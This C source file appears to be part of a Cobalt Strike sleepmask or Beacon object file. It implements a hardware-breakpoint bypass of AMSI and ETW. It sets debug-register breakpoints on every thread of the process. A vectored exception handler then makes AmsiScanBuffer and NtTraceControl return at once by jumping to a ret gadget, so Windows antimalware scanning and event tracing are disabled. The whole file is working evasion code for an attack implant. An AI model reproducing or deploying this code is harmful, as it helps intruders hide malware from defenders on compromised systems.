#include <tlhelp32.h>

// some required APIs are defined / imported already in CS provided sleepmask kit
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread();
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32First(HANDLE, LPTHREADENTRY32);
WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next(HANDLE, LPTHREADENTRY32);
WINBASEAPI PVOID WINAPI KERNEL32$AddVectoredExceptionHandler(ULONG, PVECTORED_EXCEPTION_HANDLER);
WINBASEAPI ULONG WINAPI KERNEL32$RemoveVectoredExceptionHandler(PVOID);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);

#define GetCurrentThread KERNEL32$GetCurrentThread
#define GetCurrentProcessId KERNEL32$GetCurrentProcessId
#define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
#define Thread32First KERNEL32$Thread32First
#define Thread32Next KERNEL32$Thread32Next
#define AddVectoredExceptionHandler KERNEL32$AddVectoredExceptionHandler
#define RemoveVectoredExceptionHandler KERNEL32$RemoveVectoredExceptionHandler
#define GetProcAddress KERNEL32$GetProcAddress
#define GetModuleHandleA KERNEL32$GetModuleHandleA
#define LoadLibraryA KERNEL32$LoadLibraryA


void set_hardware_breakpoint(const DWORD tid, const uintptr_t address, const UINT pos, const BOOL init)
{
    CONTEXT context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE thd;

    if (tid == GetCurrentThreadId())
    {
        thd = GetCurrentThread();
    }
    else
    {
        thd = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    }

    GetThreadContext(thd, &context);

    if (init)
    {
        (&context.Dr0)[pos] = address;
        context.Dr7 &= ~(3ull << (16 + 4 * pos));
        context.Dr7 &= ~(3ull << (18 + 4 * pos));
        context.Dr7 |= 1ull << (2 * pos);
    }
    else
    {
        if ((&context.Dr0)[pos] == address)
        {
            context.Dr7 &= ~(1ull << (2 * pos));
            (&context.Dr0)[pos] = 0ull;
        }
    }

    SetThreadContext(thd, &context);

    if (thd != INVALID_HANDLE_VALUE) CloseHandle(thd);
}


void set_hardware_breakpoints(const uintptr_t address, const UINT pos, const BOOL init, const DWORD tid)
{
    const DWORD pid = GetCurrentProcessId();
    const HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (h != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };

        if (Thread32First(h, &te)) {
            do {
                if ((te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) +
                    sizeof(te.th32OwnerProcessID)) && te.th32OwnerProcessID == pid) {
                    if (tid != 0 && tid != te.th32ThreadID) {
                        continue;
                    }
                    set_hardware_breakpoint(te.th32ThreadID, address, pos, init);

                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h, &te));
        }
        CloseHandle(h);
    }
}

uintptr_t find_gadget(const uintptr_t function, const BYTE* stub, const UINT size, const size_t dist)
{
    for (size_t i = 0; i < dist; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            return (function + i);
        }
    }
    return 0ull;
}

LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
    {
        if( ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0 || ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr1 ) {
        	
            //Below if else branch can be commented out, only for debug purpose

            if (ExceptionInfo->ContextRecord->Rip == (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceControl")) {
        		BeaconPrintf(CALLBACK_OUTPUT , "[+] In exception handler of NtTraceControl.\n");
        	} else {
        	BeaconPrintf(CALLBACK_OUTPUT , "[+] In exception handler of AmsiScanBuffer.\n");
        	}

            // End of debug branch

                ExceptionInfo->ContextRecord->Rip = find_gadget(ExceptionInfo->ContextRecord->Rip, "\xc3", 1, 500);
                ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // Set Resume Flag
        }
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}